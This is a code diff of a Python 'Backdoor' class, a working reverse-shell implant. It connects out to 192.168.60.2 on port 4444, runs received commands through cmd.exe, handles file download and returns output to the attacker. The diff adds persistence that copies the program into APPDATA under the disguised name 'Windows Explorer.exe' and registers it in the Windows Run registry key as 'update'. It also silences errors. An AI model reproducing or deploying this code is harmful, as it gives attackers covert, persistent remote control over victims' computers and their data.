@@ -1,8 +1,9 @@
-import socket, subprocess, os, json, base64
+import socket, subprocess, os, json, base64, sys, shutil
 
 class Backdoor:
 
     def __init__(self, ip, port):
+        self.become_persistant()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
     
@@ -31,12 +32,11 @@ class Backdoor:
                 break
 
     def execute_system_cmd(self, command):
-
-            if os.name == 'nt':  # If the OS is Windows
-                # Run multiple commands in a single shell session using && for chaining
-                # The /c argument tells cmd.exe to run the command and then terminate.
-                full_cmd = f'cmd.exe /c "{command}"'
-                result = subprocess.check_output(full_cmd, stderr=subprocess.PIPE, shell=True)
+            # Run multiple commands in a single shell session using && for chaining
+            # The /c argument tells cmd.exe to run the command and then terminate.
+            full_cmd = f'cmd.exe /c "{command}"'
+            DEVNULL = open(os.devnull, 'wb')
+            result = subprocess.check_output(full_cmd, stderr=DEVNULL, stdin=DEVNULL, shell=True)
             return result
     
     def change_working_directory_to(self, path):
@@ -59,7 +59,7 @@ class Backdoor:
             try:
                 if command[0].lower() == "exit":  # Handle exit command from the attacker
                     self.connection.close()
-                    break
+                    sys.exit()
                 elif command[0] == "cd" and len(command) > 1:
                     command_result = self.change_working_directory_to(command[1])
                 elif command[0] == "download" and len(command) > 1:
@@ -73,7 +73,15 @@ class Backdoor:
             except Exception:
                 command_result = "[-] Error during command execution"
             self.reliable_send(command_result)# Send the result back to the attacker
-                
 
-my_backdoor = Backdoor("192.168.60.2", 4444)
-my_backdoor.run()
+    def become_persistant(self):
+        evil_file_location = os.getenv("appdata") + "\\Windows Explorer.exe"
+        if not os.path.exists(evil_file_location):
+            shutil.copyfile(sys.executable, evil_file_location)
+            subprocess.call(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "{evil_file_location}"', shell=True)
+
+try:
+    my_backdoor = Backdoor("192.168.60.2", 4444)
+    my_backdoor.run()
+except Exception:
+    sys.exit()
